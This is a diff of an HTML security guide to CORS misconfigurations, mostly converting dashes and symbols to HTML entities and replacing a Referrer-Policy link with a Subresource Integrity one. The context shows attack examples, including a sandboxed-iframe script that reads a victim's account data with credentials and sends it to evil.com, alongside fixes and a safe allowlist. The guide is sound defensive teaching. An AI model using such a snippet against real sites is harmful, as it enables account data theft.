@@ -120,7 +120,7 @@
     <h2 id="dangerous-patterns">The five dangerous patterns</h2>
 
     <div class="misconfig-card">
-      <span class="risk">Critical — exploitable for account takeover</span>
+      <span class="risk">Critical &mdash; exploitable for account takeover</span>
       <h3>1. Reflecting the Origin header unconditionally</h3>
       <p>The server reads the incoming <code class="inline">Origin</code> header and echoes it back verbatim in <code class="inline">Access-Control-Allow-Origin</code>, combined with <code class="inline">Access-Control-Allow-Credentials: true</code>:</p>
       <pre><code># What the attack looks like on the wire
@@ -132,7 +132,7 @@ Response: Access-Control-Allow-Origin: https://evil.com
     </div>
 
     <div class="misconfig-card">
-      <span class="risk">High — whitelist bypass</span>
+      <span class="risk">High &mdash; whitelist bypass</span>
       <h3>2. Substring or regex matching instead of exact equality</h3>
       <p>A common attempt to &ldquo;secure&rdquo; a reflected origin check is to validate using a substring test:</p>
       <pre><code># These checks are all bypassable
@@ -143,14 +143,14 @@ if (origin.includes('example.com'))   → bypassed by both of the above</code></
     </div>
 
     <div class="misconfig-card">
-      <span class="risk">High — sandbox iframe bypass</span>
+      <span class="risk">High &mdash; sandbox iframe bypass</span>
       <h3>3. Allowing the <code class="inline">null</code> origin</h3>
       <p>The string <code class="inline">null</code> (not the absence of a value) appears as the <code class="inline">Origin</code> header value in requests from sandboxed iframes, <code class="inline">file://</code> URLs, and some <code class="inline">data:</code> URI contexts. A server that returns <code class="inline">Access-Control-Allow-Origin: null</code> with credentials enabled is exploitable from any page that can render a sandboxed iframe:</p>
       <pre><code>&lt;!-- Attacker's page at https://evil.com --&gt;
 &lt;iframe sandbox="allow-scripts allow-forms" srcdoc="
   &lt;script&gt;
     fetch('https://api.victim.com/account', {credentials: 'include'})
-      .then(r => r.json()).then(data => {
+      .then(r =&gt; r.json()).then(data =&gt; {
         fetch('https://evil.com/steal?d=' + JSON.stringify(data));
       });
   &lt;/script&gt;
@@ -159,21 +159,21 @@ if (origin.includes('example.com'))   → bypassed by both of the above</code></
     </div>
 
     <div class="misconfig-card">
-      <span class="risk">Medium — cache poisoning</span>
+      <span class="risk">Medium &mdash; cache poisoning</span>
       <h3>4. Missing <code class="inline">Vary: Origin</code> on dynamic CORS responses</h3>
       <p>When a server returns different <code class="inline">Access-Control-Allow-Origin</code> values depending on the incoming <code class="inline">Origin</code> (as it does with an allowlist), it must include <code class="inline">Vary: Origin</code> in every response. Without it, a CDN or intermediate cache may serve one origin&rsquo;s CORS response to a different origin&rsquo;s request. A legitimate origin might receive a response from cache that has a different origin&rsquo;s <code class="inline">Access-Control-Allow-Origin</code> value &mdash; causing a failed CORS check and a broken request. In some configurations, an attacker can exploit the ordering to poison the cache with a permissive header for their own origin.</p>
       <p><strong>Fix:</strong> include <code class="inline">Vary: Origin</code> on all CORS-enabled responses, including responses where the requesting origin is not on the allowlist.</p>
     </div>
 
     <div class="misconfig-card">
-      <span class="risk">Medium — overly permissive preflight</span>
+      <span class="risk">Medium &mdash; overly permissive preflight</span>
       <h3>5. Allowing all methods and headers in preflight responses</h3>
       <p>A preflight response (<code class="inline">OPTIONS</code>) that allows <code class="inline">Access-Control-Allow-Methods: *</code> and <code class="inline">Access-Control-Allow-Headers: *</code> means any method and any header the browser sends will be permitted in the actual request. This matters when your API uses custom auth headers or when certain HTTP methods (DELETE, PATCH) trigger privileged operations. Explicitly list the methods and headers your API actually needs:</p>
       <pre><code># Overly permissive (avoid)
 Access-Control-Allow-Methods: *
 Access-Control-Allow-Headers: *
 
-# Correct — list only what you need
+# Correct &mdash; list only what you need
 Access-Control-Allow-Methods: GET, POST, PUT, DELETE
 Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With</code></pre>
     </div>
@@ -214,7 +214,7 @@ Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With</cod
     </table>
 
     <div class="callout warn-callout">
-      <strong>Browsers refuse <code class="inline">*</code> with <code class="inline">Access-Control-Allow-Credentials: true</code>.</strong> If you set both, the browser will block the response with a CORS error — it is an invalid combination per the specification. The exploitable pattern is not the literal combination of these two headers; it is a server that returns the requesting <code class="inline">Origin</code> value (rather than <code class="inline">*</code>) paired with <code class="inline">Access-Control-Allow-Credentials: true</code>.
+      <strong>Browsers refuse <code class="inline">*</code> with <code class="inline">Access-Control-Allow-Credentials: true</code>.</strong> If you set both, the browser will block the response with a CORS error &mdash; it is an invalid combination per the specification. The exploitable pattern is not the literal combination of these two headers; it is a server that returns the requesting <code class="inline">Origin</code> value (rather than <code class="inline">*</code>) paired with <code class="inline">Access-Control-Allow-Credentials: true</code>.
     </div>
 
     <h2 id="correct-implementation">Correct allowlist implementation</h2>
@@ -226,9 +226,9 @@ Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With</cod
   'https://www.example.com',
 ]);
 
-app.use((req, res, next) => {
+app.use((req, res, next) =&gt; {
   const origin = req.headers.origin;
-  if (origin && ALLOWED_ORIGINS.has(origin)) {
+  if (origin &amp;&amp; ALLOWED_ORIGINS.has(origin)) {
     res.setHeader('Access-Control-Allow-Origin', origin);
     res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.setHeader('Vary', 'Origin');
@@ -427,10 +427,10 @@ module.exports = {
         <span class="s-name">Permissions-Policy</span>
         <p>Deny camera, microphone, geolocation, and other browser APIs your site doesn&rsquo;t need &mdash; including in third-party iframes and compromised scripts.</p>
       </a>
-      <a href="referrer-policy-header.html">
+      <a href="subresource-integrity-sri.html">
         <span class="s-tag">Fix guide</span>
-        <span class="s-name">Referrer-Policy</span>
-        <p>Control what URL data leaks to external sites every time a visitor clicks a link or loads a resource.</p>
+        <span class="s-name">Subresource Integrity (SRI)</span>
+        <p>Pin a hash to every CDN script and stylesheet tag so a compromised CDN can&rsquo;t inject malicious code into your site.</p>
       </a>
       <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">
         <span class="s-tag">Secret scanning</span>
@@ -473,6 +473,7 @@ module.exports = {
       <a href="referrer-policy-header.html">Referrer-Policy guide</a>
       <a href="permissions-policy-header.html">Permissions-Policy guide</a>
       <a href="fix-cors-misconfiguration.html">CORS guide</a>
+      <a href="subresource-integrity-sri.html">SRI guide</a>
       <a href="https://labs.copperbaytech.com/shipsafe/" target="_blank" rel="noopener noreferrer">ShipSafe</a>
       <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">LeakCheck</a>
       <a href="https://labs.copperbaytech.com/exposurecheck/" target="_blank" rel="noopener noreferrer">ExposureCheck</a>
